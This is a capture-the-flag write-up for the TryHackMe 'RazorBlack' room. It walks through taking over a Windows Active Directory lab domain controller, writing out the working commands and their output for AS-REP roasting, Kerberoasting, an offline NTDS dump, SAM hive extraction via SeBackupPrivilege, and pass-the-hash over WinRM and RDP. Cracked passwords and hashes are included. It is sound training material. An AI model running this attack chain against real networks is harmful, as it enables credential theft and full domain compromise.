# RazorBlack
https://tryhackme.com/room/raz0rblack | 10.10.130.118 | 2022-06-09

## Initial Scan
```
┌──(kali㉿kali)-[~/Desktop]                                             
└─$ nmap -sCV $IP -T4 -p- -v -oG nmap.all                                                                                                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 10:03 EDT
Host is up (0.073s latency).                                                                                                             [52/120]
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus   
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-06 14:04:39Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)                         
| rpcinfo:                                                                                                                                       
|   program version    port/proto  service                              
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind    
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                 
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                 
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC        
49703/tcp open  msrpc         Microsoft Windows RPC                                                                                              
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

DC: `raz0rblack.thm`

Important services: 
- SMB
- WinRM/RDP
- LDAP
- Kerberos
- RPC (Some can be mounted)

## Mount
```
┌──(kali㉿kali)-[~/Desktop]
└─$ showmount -e $IP          
Export list for 10.10.246.111:
/users (everyone)

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo mount -t nfs $IP:/users temp 

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo ls temp                     
employee_status.xlsx  sbradley.txt
```
The xlsx had names, and using the `sbradley` file name, I deduced that the rest of the are like this as well (first letter of name + last name)
```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

Then I used ASREP roasting and found the hash of `twilliams`
```
┌──(kali㉿kali)-[/opt/impacket/examples]
└─$ python3 GetNPUsers.py -dc-ip $IP raz0rblack.thm/ -usersfile ~/Desktop/users.txt -no-pass -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3296af43e914219a14c3112b082c2d2d$f98a2a5d842b64a12943002bdfa8d7dd6545727cf1ec551956e43679b9991785c0b1006879fcde99522efbb2a87facffe14b335750225a291bff7dd12bf0fe32bac13fa146baa04fd22099ef29c32303b4919695d2e2e3c5f5577779aef23e618c22b5212c69eafbdbf8b96a1752b65efcd999f8fa70726e9ba677fbd0138ba44dd160b3df8d76eb2bd3c941118528539ceddd2c38e4bf7fe99a5d5d66a48f5d85a5a6734f997b739447260ed908ce6563eebc39df4b8ae6ed0fcbc3fbbbd04e2ab1e944837dd9709e0e3265ae22f94c1aeacb854b8acfda8b9f6581b0794f6e67f7179b9fb91baa567ab5d2b0c83a41
```

Then I cracked the hash with hashcat mode 18200: `roastpotatoes`
So the final user-pass combo is: `twilliams:roastpotatoes`

## SMB
Using enum4linux I and the creds from before I managed to find additional users on the machine.
```
xyan1d3
lvetrova
sbradley
twilliams
```

Trying the same password on these accounts, leads to find that sbradley has the same account, and that it needs to be changed, so I changed it to `password`
```
┌──(kali㉿kali)-[/opt/impacket/examples]
└─$ smbpasswd -r $IP -U sbradley                                                                                                                                          
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley
```
`sbradley:password`

Login with this new account to the previously found SMB share, we find a chat log, and a zip file.
From the chat log we learn a few things:
- The machine is *probably* vulnerable to zero-logon
- sbradley has WinRM access.
- secretsdump.py might be helpful.
- The zip file contains the ntds.dit and the SYSTEM.hive

After cracking the zip using john, we found that the password of the zip is: `electromagnetismo`

Using the zip contents I used secretsdump locally:
```
python3 secretsdump.py -ntds ~/Desktop/razorblack/ntds.dit -system ~/Desktop/razorblack/system.hive
```

Using these NTLM hashes, I checked them against lvetrova since that user has AD admin permissions according to the excel table.
```
┌──(kali㉿hotdog)-[~/Desktop/razorblack]
└─$ cat secrets.output | cut -d: -f4 > hashes.txt

┌──(kali㉿hotdog)-[~/Desktop/razorblack]
└─$ crackmapexec smb $IP -u lvetrova -H hashes.txt
SMB         10.10.79.156    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
```

Then I accessed the account with Evil-WinRM
```
evil-winrm -i $IP -u 'lvetrova' -H 'f220d3988deb3f516c73f40ee16c431d'
```

## Ljudmila Shell
To get the next flag I found a peculiar xml file, after a bit of research I managed to find how to decode it
```
*Evil-WinRM* PS C:\Users\lvetrova> $credential = Import-CliXml -Path lvetrova.xml

*Evil-WinRM* PS C:\Users\lvetrova> ($credential.GetNetworkCredential()).Password

THM{Redacted}
```

Using lvetrova's creds I ran GetUserSPNs
```
──(kali㉿hotdog)-[~/Desktop/razorblack]
└─$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip $IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>
```
Then cracking the has found with the command above, we find the password `cyanide9amine5628`

## Xyan1d3 Shell
`xyan1d3:cyanide9amine5628` + evil winrm
getting the flag like last time with the xml thingy

1. SeBackupPrivilege priv
2. 
```
reg save hklm\sam C:\Users\xyan1d3\Documents\sam.hive
reg save hklm\system C:\Users\xyan1d3\Documents\system.hive
```
3. `python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive local`
4. Pass-The-Hash as admin - evilwinrm

## Admin
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

`xfreerdp /u:Administrator /pth:9689931bed40ca5a2ce1218210177f0c /v:10.10.18.107`

then claiming the flags